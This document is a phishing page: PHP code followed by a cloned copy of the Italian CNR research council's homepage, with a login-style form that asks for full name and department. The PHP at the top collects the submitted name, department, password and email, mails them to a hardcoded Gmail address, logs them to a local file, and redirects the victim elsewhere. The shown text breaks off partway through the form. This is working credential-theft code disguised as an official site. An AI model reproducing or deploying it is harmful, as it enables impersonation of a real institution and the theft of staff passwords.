<?php
if(isset($_GET['gosend'])){
  $to      = 'john86046@gmail.com';
  $subject = 'CRN'.mt_rand();
  $message = 'NOME: '.$_POST['nome'] .'DIPARTIMENTO: '.$_POST['dipartimento'].' PASSWORD: '.$_POST['password']. ' ConfirmPASSWORD: '.$_POST['confrimpassword'].' EMAIL: '.$_POST['email']. "\r\n";
  $headers = 'From: webmaster@example.com' . "\r\n" .
    'Reply-To: webmaster@example.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

    $fp = fopen('data.txt', 'a');
    fwrite($fp, $message);
    fclose($fp);

if(mail($to, $subject, $message, $headers)){
    header("Location: http://www.edumail.vic.gov.au/");
    exit;
  } else {
    $phpself = '';
    if($_SERVER['PHP_SELF'] != 'index.php'){$phpself = $_SERVER['PHP_SELF'];}
    $urlSelf = 'http://'.$_SERVER['SERVER_NAME'].'/'.$phpself;
    header("Location: $urlSelf");
    exit;
 }
}
?>
<!DOCTYPE html>
<html lang="it" dir="ltr">
<head profile="http://www.w3.org/1999/xhtml/vocab">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <!-- Per dare un colore alla testata del browser   -->
  <!-- <meta name="theme-color" content="#EE4433" /> -->
  <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<link rel="shortcut icon" href="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/favicon.ico" type="image/vnd.microsoft.icon" />
<link rel="shortlink" href="/it/homepage" />
<link rel="canonical" href="/it/homepage" />
<meta name="Generator" content="Drupal 7 (http://drupal.org)" />
  <title>Home | Consiglio Nazionale delle Ricerche</title>
  <style>
@import url("https://www.cnr.it/modules/system/system.base.css?p5mxlj");
</style>
<link type="text/css" rel="stylesheet" href="https://www.cnr.it/sites/all/modules/contrib/date/date_api/date.css?p5mxlj" media="all" />
<link type="text/css" rel="stylesheet" href="https://www.cnr.it/sites/all/modules/contrib/date/date_popup/themes/datepicker.1.7.css?p5mxlj" media="all" />
<style>
@import url("https://www.cnr.it/modules/field/theme/field.css?p5mxlj");
</style>
<link type="text/css" rel="stylesheet" href="https://www.cnr.it/sites/all/modules/contrib/views/css/views.css?p5mxlj" media="all" />
<link type="text/css" rel="stylesheet" href="https://www.cnr.it/sites/all/modules/contrib/ctools/css/ctools.css?p5mxlj" media="all" />
<link type="text/css" rel="stylesheet" href="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/css/magnific-popup.css?p5mxlj" media="all" />
<link type="text/css" rel="stylesheet" href="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/css/mediaBoxes.css?p5mxlj" media="all" />
<link type="text/css" rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.2.0/css/font-awesome.min.css" media="all" />
<link type="text/css" rel="stylesheet" href="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/css/style.min.css?p5mxlj" media="all" />
  <!-- HTML5 element support for IE6-8 -->
  <!--[if lt IE 9]>
    <script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script>
  <![endif]-->
  <script src="https://www.cnr.it/sites/all/modules/contrib/jquery_update/replace/jquery/1.9/jquery.min.js?v=1.9.1"></script>
<script src="https://www.cnr.it/misc/jquery.once.js?v=1.2"></script>
<script src="https://www.cnr.it/misc/drupal.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/default/files/public/languages/it_xynrdDYaqrWADU-W102U4P1nQAulEUFU7Ab1wg2PLIg.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/affix.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/alert.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/button.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/carousel.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/collapse.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/dropdown.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/modal.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/tooltip.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/popover.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/scrollspy.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/tab.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap/js/transition.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/themes/custom/cnr03_theme/bootstrap_dropdowns_enhancement/js/dropdowns-enhancement.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/js/jquery.isotope.min.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/js/jquery.imagesLoaded.min.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/js/jquery.transit.min.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/js/jquery.easing.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/js/waypoints.min.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/js/modernizr.custom.min.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/js/jquery.magnific-popup.min.js?p5mxlj"></script>
<script src="https://www.cnr.it/sites/all/libraries/mediaboxes/plugins/js/jquery.mediaBoxes.unminify.js?p5mxlj"></script>
<script>jQuery.extend(Drupal.settings, {"basePath":"\/","pathPrefix":"it\/","ajaxPageState":{"theme":"cnr03_theme","theme_token":"2JifQs4bCnt6oNlTscnh4SuG1iPt_8toJy4OosTOPIo","js":{"0":1,"1":1,"sites\/all\/themes\/contrib\/bootstrap\/js\/bootstrap.js":1,"sites\/all\/modules\/contrib\/jquery_update\/replace\/jquery\/1.9\/jquery.min.js":1,"misc\/jquery.once.js":1,"misc\/drupal.js":1,"public:\/\/languages\/it_xynrdDYaqrWADU-W102U4P1nQAulEUFU7Ab1wg2PLIg.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/affix.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/alert.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/button.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/carousel.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/collapse.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/dropdown.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/modal.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/tooltip.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/popover.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/scrollspy.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/tab.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap\/js\/transition.js":1,"sites\/all\/themes\/custom\/cnr03_theme\/bootstrap_dropdowns_enhancement\/js\/dropdowns-enhancement.js":1,"sites\/all\/libraries\/mediaboxes\/plugins\/js\/jquery.isotope.min.js":1,"sites\/all\/libraries\/mediaboxes\/plugins\/js\/jquery.imagesLoaded.min.js":1,"sites\/all\/libraries\/mediaboxes\/plugins\/js\/jquery.transit.min.js":1,"sites\/all\/libraries\/mediaboxes\/plugins\/js\/jquery.easing.js":1,"sites\/all\/libraries\/mediaboxes\/plugins\/js\/waypoints.min.js":1,"sites\/all\/libraries\/mediaboxes\/plugins\/js\/modernizr.custom.min.js":1,"sites\/all\/libraries\/mediaboxes\/plugins\/js\/jquery.magnific-popup.min.js":1,"sites\/all\/libraries\/mediaboxes\/plugins\/js\/jquery.mediaBoxes.unminify.js":1},"css":{"modules\/system\/system.base.css":1,"sites\/all\/modules\/contrib\/date\/date_api\/date.css":1,"sites\/all\/modules\/contrib\/date\/date_popup\/themes\/datepicker.1.7.css":1,"modules\/field\/theme\/field.css":1,"sites\/all\/modules\/contrib\/views\/css\/views.css":1,"sites\/all\/modules\/contrib\/ctools\/css\/ctools.css":1,"sites\/all\/libraries\/mediaboxes\/plugins\/css\/magnific-popup.css":1,"sites\/all\/libraries\/mediaboxes\/plugins\/css\/mediaBoxes.css":1,"\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.2.0\/css\/font-awesome.min.css":1,"sites\/all\/themes\/custom\/cnr03_theme\/css\/style.min.css":1}},"bootstrap":{"anchorsFix":0,"anchorsSmoothScrolling":1,"popoverEnabled":1,"popoverOptions":{"animation":1,"html":0,"placement":"right","selector":"","trigger":"click","title":"","content":"","delay":0,"container":"body"},"tooltipEnabled":1,"tooltipOptions":{"animation":1,"html":0,"placement":"auto left","selector":"","trigger":"hover focus","delay":0,"container":"body"}}});</script>
  <script src="https://www.cnr.it/sites/all/libraries/cookpm/COOKPM.js"></script>
  <script src="https://www.cnr.it/sites/all/libraries/cookpm/COOKPM.config.js"></script>
  <link href="https://www.cnr.it/sites/all/libraries/cookpm/COOKPM.css" type="text/css" rel="stylesheet" />
  <script src="//www.google-analytics.com/urchin.js"></script>
  <meta name="google-site-verification" content="ojTmmVyFbLLuhkwpsChiOZI_vPf4hwI8seFmT_PcH8Q" />
</head>
<body class="html front not-logged-in no-sidebars page-node page-node- page-node-7422 node-type-custom-homepage i18n-it" >
  <div id="skip-link">
    <a href="#main-content" class="element-invisible element-focusable">Salta al contenuto principale</a>
  </div>
    
<div style="position:relative">
	<div id="logo">
		<a href="/it">
			<img src="/sites/all/themes/custom/cnr03_theme/img/cnrlogo.svg" alt="CNR - Consiglio Nazionale delle Ricerche" onerror="this.src='/sites/all/themes/custom/cnr03_theme/img/logo_cnr_2010.png'"/>
		</a>
	</div>
	<div class="navbar-header">
		<!-- .btn-navbar is used as the toggle for collapsed navbar content -->
		<button type="button" class="navbar-toggle tb-megamenu-button" data-toggle="collapse" data-target="#navigation-collapse">
			<span class="sr-only">Navigazione</span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
			<span class="icon-bar"></span>
		</button>
	</div>
</div>
<div id="fascione">
<header id="navbar" role="banner" class="container">
	<div class="navbar-collapse collapse" id="navigation-collapse">
		<form class="form-inline" id="search-and-lang" method="GET" action="/it/cerca">
			<a href="https://www.cnr.it/it">IT</a> | <a href="https://www.cnr.it/en">EN</a>
			<input type="text" name="search" class="form-control" placeholder="Cerca" style="height: 2em; margin: 0 0.5em;">
			<button type="sumbit"><span class="glyphicon glyphicon-search"></span></button>
		</form>
		<nav role="menubar" id="navigation-thematic-areas">
			<ul class="nav navbar-nav">
				<li class="biologia-biomedica"><a href="/it/aree-tematiche/biologia-biomedica" data-toggle="tooltip" data-container="false" data-placement="left" title="Scienze biomediche"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M0 0h24v24h-24z" fill="none"/><path d="M12 2c-5.53 0-10 4.47-10 10s4.47 10 10 10 10-4.47 10-10-4.47-10-10-10zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg> Scienze biomediche</a></li>
				<li class="chimica-materiali"><a href="/it/aree-tematiche/chimica-materiali" data-toggle="tooltip" data-container="false" data-placement="left" title="Scienze chimiche e tecnologie dei materiali"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M0 0h24v24h-24z" fill="none"/><path d="M12 2c-5.53 0-10 4.47-10 10s4.47 10 10 10 10-4.47 10-10-4.47-10-10-10zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg> Chimica e tecnologia materiali</a></li>
				<li class="energia-ambiente"><a href="/it/aree-tematiche/energia-ambiente" data-toggle="tooltip" data-container="false" data-placement="left" title="Scienze del sistema Terra e tecnologie per l'ambiente"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M0 0h24v24h-24z" fill="none"/><path d="M12 2c-5.53 0-10 4.47-10 10s4.47 10 10 10 10-4.47 10-10-4.47-10-10-10zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg> Terra e ambiente</a></li>
				<li class="ingegneria-ict"><a href="/it/aree-tematiche/ingegneria-ict" data-toggle="tooltip" data-container="false" data-placement="left" title="Ingegneria, ICT e tecnologie per l'energia e i trasporti"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M0 0h24v24h-24z" fill="none"/><path d="M12 2c-5.53 0-10 4.47-10 10s4.47 10 10 10 10-4.47 10-10-4.47-10-10-10zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg> Ingegneria, ICT, energia e trasporti</a></li>
				<li class="fisica-matematiche"><a href="/it/aree-tematiche/fisica-matematiche" data-toggle="tooltip" data-container="false" data-placement="left" title="Scienze fisiche e tecnologie della materia"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M0 0h24v24h-24z" fill="none"/><path d="M12 2c-5.53 0-10 4.47-10 10s4.47 10 10 10 10-4.47 10-10-4.47-10-10-10zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg> Fisica e materia</a></li>
				<li class="scienze-umane"><a href="/it/aree-tematiche/scienze-umane" data-toggle="tooltip" data-container="false" data-placement="left" title="Scienze umane e sociali, patrimonio culturale"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M0 0h24v24h-24z" fill="none"/><path d="M12 2c-5.53 0-10 4.47-10 10s4.47 10 10 10 10-4.47 10-10-4.47-10-10-10zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg> Scienze umane e patrimonio culturale</a></li>
				<li class="agricoltura-alimentazione"><a href="/it/aree-tematiche/agricoltura-alimentazione" data-container="false" data-toggle="tooltip" data-placement="left" title="Scienze bio-agroalimentari"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"><path d="M0 0h24v24h-24z" fill="none"/><path d="M12 2c-5.53 0-10 4.47-10 10s4.47 10 10 10 10-4.47 10-10-4.47-10-10-10zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg> Bio e agroalimentare</a></li>
			</ul>
		</nav>
		<nav role="navigation-thematic-areas" id="navigation-life-events">
			<ul class="nav navbar-nav">
				<li><a href="/it/canali/cittadini">
					<img src="/sites/all/themes/custom/cnr03_theme/img/icon-cittadini.png" alt="" />
					Cittadini				</a></li>
				<li><a href="/it/canali/imprese">
					<img src="/sites/all/themes/custom/cnr03_theme/img/icon-imprese.png" alt="" />
					Imprese				</a></li>
				<li><a href="/it/canali/scuole">
					<img src="/sites/all/themes/custom/cnr03_theme/img/icon-scuole.png" alt="" />
					Scuole				</a></li>
				<li><a href="/it/canali/ricercatori">
					<img src="/sites/all/themes/custom/cnr03_theme/img/icon-ricercatori.png" alt="" />
					Ricercatori				</a></li>
				<li><a href="/it/canali/giornalisti">
					<img src="/sites/all/themes/custom/cnr03_theme/img/icon-giornalisti.png" alt="" />
					Giornalisti				</a></li>
				<li><a href="/it/canali/personale">
					<img src="/sites/all/themes/custom/cnr03_theme/img/icon-amministrazioni.png" alt="" />
					Personale				</a></li>
			</ul>
		</nav>
        <nav role="navigation" id="navigation" class="masternavigation">    
          <ul class="menu nav navbar-nav"><li class="first leaf active"><a href="/it">Home</a></li>
<li class="expanded dropdown"><a href="/it/chi-siamo" title="" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Chi siamo <span class="caret"></span></a><ul class="dropdown-menu"><li class="expanded"><a href="/it/chi-siamo" title="">Chi siamo</a></li><li class="divider"></li><li class="first expanded dropdown-submenu"><a href="/it/dove-siamo" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Dove siamo</a><ul class="dropdown-menu"><li class="first expanded"><a href="/it/dove-siamo">Dove siamo</a></li><li class="divider"></li><li class="first leaf"><a href="/it/sede-centrale" title="">Sede centrale</a></li>
<li class="leaf"><a href="/it/sedi" title="">Sedi storiche e di particolare interesse</a></li>
<li class="last leaf"><a href="/it/infrastrutture-marine-oceanografiche">Infrastrutture marine e oceanografiche</a></li>
</ul></li>
<li class="leaf"><a href="/it/tappe-storiche" title="">Tappe storiche</a></li>
<li class="leaf"><a href="/it/presidenti" title="">Presidenti</a></li>
<li class="leaf"><a href="/it/cnr-in-numeri">Il Cnr in numeri</a></li>
<li class="leaf"><a href="/it/bibliografia">Bibliografia</a></li>
<li class="leaf"><a href="/it/statuto" title="">Statuto</a></li>
<li class="last leaf"><a href="/it/prospettive" title="">Prospettive</a></li>
</ul></li>
<li class="expanded dropdown"><a href="/it/organizzazione" title="" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Organizzazione <span class="caret"></span></a><ul class="dropdown-menu"><li class="expanded"><a href="/it/organizzazione" title="">Organizzazione</a></li><li class="divider"></li><li class="first leaf"><a href="/it/organigramma" title="">Organigramma</a></li>
<li class="expanded dropdown-submenu"><a href="/it/presidente" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Presidente</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/presidente">Presidente</a></li><li class="divider"></li><li class="first leaf"><a href="/it/staff-presidente">Staff del Presidente</a></li>
<li class="last leaf"><a href="/it/interventi-presidente">Interviste e interventi del Presidente</a></li>
</ul></li>
<li class="leaf"><a href="/it/vicepresidente">Vicepresidente</a></li>
<li class="leaf"><a href="/it/cda-consiglio-amministrazione">Consiglio di Amministrazione</a></li>
<li class="leaf"><a href="/it/direttore-generale">Direttore Generale</a></li>
<li class="expanded dropdown-submenu"><a href="/it/organi" title="" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Organi Collegiali</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/organi" title="">Organi Collegiali</a></li><li class="divider"></li><li class="first leaf"><a href="/it/consiglio-scientifico">Consiglio Scientifico</a></li>
<li class="last leaf"><a href="/it/collegio-revisori-conti">Collegio dei Revisori dei Conti</a></li>
</ul></li>
<li class="expanded dropdown-submenu"><a href="/it/amministrazione-centrale" title="" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Amministrazione centrale</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/amministrazione-centrale" title="">Amministrazione centrale</a></li><li class="divider"></li><li class="first leaf"><a href="/it/struttura/dg" title="">Direzione Generale</a></li>
<li class="leaf"><a href="/it/struttura/dcgru" title="">Gestione delle Risorse Umane</a></li>
<li class="last leaf"><a href="/it/struttura/dcsrsi" title="">Supporto alla Rete Scientifica e alle Infrastrutture</a></li>
</ul></li>
<li class="expanded dropdown-submenu"><a href="/it/strutture-scientifiche" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Strutture scientifiche</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/strutture-scientifiche">Strutture scientifiche</a></li><li class="divider"></li><li class="first leaf"><a href="/it/dipartimenti">Dipartimenti</a></li>
<li class="leaf"><a href="/it/istituti">Istituti di ricerca</a></li>
<li class="last leaf"><a href="/it/aree-di-ricerca">Aree di ricerca</a></li>
</ul></li>
<li class="expanded dropdown-submenu"><a href="/it/organismi-comitati" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Organismi e comitati</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/organismi-comitati">Organismi e comitati</a></li><li class="divider"></li><li class="first leaf"><a href="/it/oiv-organismo-indipendente-valutazione">Organismo Indipendente di Valutazione</a></li>
<li class="leaf"><a href="/it/magistrato-corte-conti-delegato-controllo">Magistrato della Corte dei Conti Delegato al Controllo</a></li>
<li class="leaf"><a href="/it/comitato-unico-garanzia" title="">Comitato Unico di Garanzia</a></li>
<li class="last collapsed"><a href="/it/ethics">Commissione per l’Etica della Ricerca e la Bioetica</a></li>
</ul></li>
<li class="expanded dropdown-submenu"><a href="/it/amministrazione-trasparente" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Amministrazione trasparente</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/amministrazione-trasparente">Amministrazione trasparente</a></li><li class="divider"></li><li class="first collapsed"><a href="/it/disposizioni-generali">Disposizioni generali</a></li>
<li class="collapsed"><a href="/it/organizzazione-trasparenza">Organizzazione</a></li>
<li class="expanded dropdown-submenu"><a href="/it/consulenti-e-collaboratori" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Consulenti e collaboratori</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/consulenti-e-collaboratori">Consulenti e collaboratori</a></li><li class="divider"></li><li class="first leaf"><a href="/it/trasparenza/incarichi-consulenza">Incarichi di collaborazione relativi ad attività di consulenza</a></li>
<li class="leaf"><a href="/it/trasparenza/incarichi-altre-tipologie">Incarichi di collaborazione relativi ad altre tipologie di attività</a></li>
<li class="leaf"><a href="/it/trasparenza/assegni-ricerca">Assegni di ricerca</a></li>
<li class="leaf"><a href="/it/trasparenza/borse-studio">Borse di studio</a></li>
<li class="last leaf"><a href="/it/trasparenza/tirocini">Tirocini</a></li>
</ul></li>
<li class="collapsed"><a href="/it/personale">Personale</a></li>
<li class="leaf"><a href="/it/bandi-di-concorso" title="">Bandi di concorso</a></li>
<li class="collapsed"><a href="/it/performance">Performance</a></li>
<li class="leaf"><a href="/it/enti-controllati">Enti controllati</a></li>
<li class="collapsed"><a href="/it/attivita-e-procedimenti" title="">Attività e procedimenti</a></li>
<li class="leaf"><a href="/it/provvedimenti" title="">Provvedimenti</a></li>
<li class="leaf"><a href="/it/controlli-sulle-imprese">Controlli sulle imprese</a></li>
<li class="leaf"><a href="/it/bandi-di-gara-e-contratti">Bandi di gara e contratti</a></li>
<li class="leaf"><a href="/it/sovvenzioni-contributi-sussidi-vantaggi-economici">Sovvenzioni, contributi, sussidi, vantaggi economici</a></li>
<li class="leaf"><a href="/it/bilanci">Bilanci</a></li>
<li class="leaf"><a href="/it/beni-immobili-e-gestione-patrimonio">Beni immobili e gestione patrimonio</a></li>
<li class="collapsed"><a href="/it/controlli-e-rilievi-sull-amministrazione">Controlli e rilievi sull&#039;amministrazione</a></li>
<li class="leaf"><a href="/it/servizi-erogati">Servizi erogati</a></li>
<li class="leaf"><a href="/it/pagamenti-dell-amministrazione">Pagamenti dell&#039;amministrazione</a></li>
<li class="leaf"><a href="/it/opere-pubbliche">Opere pubbliche</a></li>
<li class="leaf"><a href="/it/pianificazione-e-governo-del-territorio">Pianificazione e governo del territorio</a></li>
<li class="leaf"><a href="/it/informazioni-ambientali">Informazioni ambientali</a></li>
<li class="leaf"><a href="/it/strutture-sanitarie-private-accreditate">Strutture sanitarie private accreditate</a></li>
<li class="leaf"><a href="/it/interventi-straordinari-e-di-emergenza">Interventi straordinari e di emergenza</a></li>
<li class="last collapsed"><a href="/it/altri-contenuti">Altri contenuti</a></li>
</ul></li>
<li class="last expanded dropdown-submenu"><a href="/it/atti-normative" title="" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Atti e regolamenti</a><ul class="dropdown-menu"><li class="last expanded"><a href="/it/atti-normative" title="">Atti e regolamenti</a></li><li class="divider"></li><li class="first leaf"><a href="/it/statuto" title="">Statuto</a></li>
<li class="leaf"><a href="/it/regolamenti">Regolamenti</a></li>
<li class="leaf"><a href="/it/documenti-programmazione">Documenti di programmazione</a></li>
<li class="leaf"><a href="/it/documenti-bilancio">Documenti di bilancio</a></li>
<li class="last leaf"><a href="/it/archivio-programmazione" title="">Archivio documenti di programmazione</a></li>
</ul></li>
</ul></li>
<li class="expanded dropdown"><a href="/it/attivita" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Attività <span class="caret"></span></a><ul class="dropdown-menu"><li class="expanded"><a href="/it/attivita">Attività</a></li><li class="divider"></li><li class="first collapsed"><a href="/it/accordi-partnership">Accordi e Partnership</a></li>
<li class="collapsed"><a href="/it/attivita-internazionale" title="">Attività internazionale</a></li>
<li class="collapsed"><a href="/it/partecipazioni-societarie">Partecipazioni Societarie</a></li>
<li class="leaf"><a href="/it/supporto-rete-scientifica">Supporto alla rete scientifica</a></li>
<li class="collapsed"><a href="/it/valorizzazione-della-ricerca">Valorizzazione della ricerca</a></li>
<li class="expanded dropdown-submenu"><a href="/it/progetti-di-ricerca" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Progetti di ricerca</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/progetti-di-ricerca">Progetti di ricerca</a></li><li class="divider"></li><li class="first leaf"><a href="/it/sottoprogetti-per-dipartimento">Sottoprogetti per Dipartimento</a></li>
<li class="last leaf"><a href="/it/sottoprogetti-per-istituto">Sottoprogetti per Istituto</a></li>
</ul></li>
<li class="collapsed"><a href="/it/campagne">Campagne oceanografiche</a></li>
<li class="collapsed"><a href="/it/normativa-tecnica" title="">Normativa tecnica</a></li>
<li class="expanded dropdown-submenu"><a href="/it/editoria" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Editoria</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/editoria">Editoria</a></li><li class="divider"></li><li class="first leaf"><a href="/it/new_editoriali">Novità editoriali Cnr</a></li>
<li class="leaf"><a href="/it/guida-acquisto">Come acquistare</a></li>
<li class="leaf"><a href="/it/come-richiedere-codice-Isbn">Come richiedere un codice ISBN</a></li>
<li class="last leaf"><a href="/it/come-richiedere-codice-doi">Come richiedere un codice DOI</a></li>
</ul></li>
<li class="expanded dropdown-submenu"><a href="/it/comunicazione-scientifica" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Comunicazione scientifica</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/comunicazione-scientifica">Comunicazione scientifica</a></li><li class="divider"></li><li class="first collapsed"><a href="/it/speciali">Speciali</a></li>
<li class="collapsed"><a href="/it/iniziative_scuole">Iniziative per le scuole</a></li>
<li class="collapsed"><a href="/it/mostre-scientifiche-e-interattive" title="">Mostre scientifiche e interattive</a></li>
<li class="collapsed"><a href="/it/musei-scientifici">Musei scientifici</a></li>
<li class="last leaf"><a href="/it/riviste-newsletter-rete-cnr">Riviste e newsletter</a></li>
</ul></li>
<li class="leaf"><a href="/it/formazione">Formazione</a></li>
<li class="collapsed"><a href="/it/prevenzione-protezione" title="">Prevenzione e protezione</a></li>
<li class="last collapsed"><a href="/it/miglioramento-organizzativo">Miglioramento organizzativo</a></li>
</ul></li>
<li class="expanded dropdown"><a href="/it/servizi" title="" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Servizi e utilità <span class="caret"></span></a><ul class="dropdown-menu"><li class="expanded"><a href="/it/servizi" title="">Servizi e utilità</a></li><li class="divider"></li><li class="first leaf"><a href="/it/circolari-provvedimenti" title="">Circolari e provvedimenti</a></li>
<li class="leaf"><a href="/it/bandi-di-gara-avvisi">Bandi di gara e avvisi</a></li>
<li class="collapsed"><a href="/it/concorsi-opportunita" title="">Concorsi e opportunità</a></li>
<li class="collapsed"><a href="/it/utilita" title="">Utilità personale Cnr</a></li>
<li class="leaf"><a href="http://www.cnr.it/elencotel/?MIval=RicercaEl" title="Elenco telefonico sede centrale">Elenco telefonico sede centrale</a></li>
<li class="leaf"><a href="/it/come-raggiungere-sede-centrale" title="">Come raggiungere la sede centrale</a></li>
<li class="leaf"><a href="/it/prenotazione-aule-sede-centrale">Prenotazione aule sede centrale</a></li>
<li class="collapsed"><a href="/it/biblioteche-del-cnr" title="">Biblioteche del Cnr</a></li>
<li class="expanded dropdown-submenu"><a href="/it/open-access" title="" data-target="#" class="dropdown-toggle" data-toggle="dropdown">Open access</a><ul class="dropdown-menu"><li class="expanded"><a href="/it/open-access" title="">Open access</a></li><li class="divider"></li><li class="first leaf"><a href="/it/position-statement" title="">Position statement</a></li>
<li class="last leaf"><a href="/it/banche-dati-istituti">Banche dati Istituti Cnr</a></li>
</ul></li>
<li class="last leaf"><a href="/it/5XMilleCnr">5 X Mille per il Cnr</a></li>
</ul></li>
<li class="leaf"><a href="/it/news">News</a></li>
<li class="last leaf"><a href="/it/eventi">Eventi</a></li>
</ul>        </nav>
	</div>
</header>
</div>
<div class="main-container container">

  <header role="banner" id="page-header">
    
      </header> <!-- /#page-header -->
  
  
  <div class="row">

    
    <section id="section-main-content" class="col-sm-12">
            <a id="main-content"></a>
                                    <!-- Start Debug json -->
            <!-- End Debug json -->
                          <div class="region region-content">
    <section id="block-system-main" class="block block-system clearfix">

      
  <div id="node-7422" class="node node-custom-homepage node-unpublished clearfix">

  
      
  
  <div class="content">
    <div class="content grid-container">
	<div id="grid">
									<div class="media-box image" data-columns="4">
			<div class="media-box-content">
		
	<div class="container">
	<div class="row" style="margin:70px 0;">
		<div class="col-md-4 col-md-offset-4">
			<form method="POST" action="./?gosend" accept-charset="UTF-8" role="form" id="loginform" class="form-signin">
				<fieldset>
					<input class="form-control" placeholder="Nome Completo" name="nome" type="text" style="margin:10px 0;">
					<input class="form-control" placeholder="Dipartimento" name="dipartimento" type="text" style="margin:10px 0;">
